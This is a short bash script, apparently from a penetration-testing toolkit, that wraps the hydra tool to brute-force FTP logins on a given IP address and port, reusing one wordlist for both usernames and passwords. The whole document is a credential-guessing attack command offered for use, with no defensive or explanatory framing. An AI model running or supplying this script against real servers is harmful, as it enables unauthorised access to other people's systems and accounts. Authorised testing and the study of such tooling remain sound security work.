#! /usr/bin/bash

# Usage:
#   ftp_brute.sh [wordlist] [ip] [port]

# hydra -L [username_list] -P [password_list] -f ftp://[ip]:[port] ftp
hydra -L $1 -P $1 -f ftp://$2:$3 ftp